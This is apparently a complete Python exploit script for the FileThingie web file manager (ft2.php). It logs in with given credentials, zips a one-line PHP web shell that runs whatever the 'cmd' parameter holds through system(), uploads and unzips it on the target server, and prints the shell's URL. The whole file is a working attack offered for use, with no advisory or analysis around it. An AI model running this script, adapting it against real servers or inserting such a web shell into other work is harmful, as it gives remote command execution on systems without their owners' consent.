import os
import argparse
import requests
import zipfile
from urllib.parse import urlsplit, urlunsplit


class Exploit:
    def __init__(self, target, username, password):
        self.target = target
        self.username = username
        self.password = password

    def try_login(self) -> bool:
        self.session = requests.Session()
        post_body = {"ft_user": self.username, "ft_pass": self.password, "act": "dologin"}
        response = self.session.post(self.target, data=post_body)
        if "Invalid username or password" in response.text:
            print("[-] Invalid username or password")
            return False
        print("[+] Login successful")
        return True

    def create_payload(self) -> bool:
        self.payload_filename = "shell"
        payload = "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
        try:
            with zipfile.ZipFile(f"{self.payload_filename}.zip", 'w', zipfile.ZIP_DEFLATED) as zip_file:
                zip_file.writestr(f"{self.payload_filename}.php", payload)
                print("[+] Payload zipped successfully")
                return True
        except Exception as e:
            print(f"[-] Failed to create payload: {e}")
            return False

    def upload_payload(self) -> bool:
        print("[*] Uploading payload")
        files = {'localfile': (f"{self.payload_filename}.zip", open(f"{self.payload_filename}.zip", 'rb'), 'application/zip')}
        post_body = {"act": "upload", "dir": "", "submit": "Upload"}
        response = self.session.post(self.target, files=files, data=post_body)
        if f"{self.payload_filename}.zip" in response.text:
            print("[+] Upload successful")
            return True
        else:
            print("[-] Upload failed")
            return False

    def unzip_payload(self) -> bool:
        print("[*] Unzipping payload")
        post_body = {"newvalue": f"{self.payload_filename}.zip", "file": f"{self.payload_filename}.zip", "dir": "", "act": "unzip"}
        response = self.session.post(self.target, data=post_body)
        if "unzipped." in response.text:
            print("[+] Unzip successful")
            print(f"[+] Payload URL: {self.get_base_url()}/{self.payload_filename}.php?cmd=<command>")
            return True
        else:
            print("[-] Unzipping failed")
            return False

    def get_base_url(self) -> str:
        url_parts = urlsplit(self.target)
        path_parts = url_parts.path.split('/')[:-1]
        base_url = urlunsplit((url_parts.scheme, url_parts.netloc, '/'.join(path_parts), "", ""))
        return base_url

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target URL to ft2.php")
    parser.add_argument("-u", "--username", required=True, help="FileThingie username")
    parser.add_argument("-p", "--password", required=True, help="FileThingie password")
    args = parser.parse_args()

    exploit = Exploit(args.target, args.username, args.password)
    
    if exploit.try_login():
        if exploit.create_payload():
            if exploit.upload_payload():
                exploit.unzip_payload()
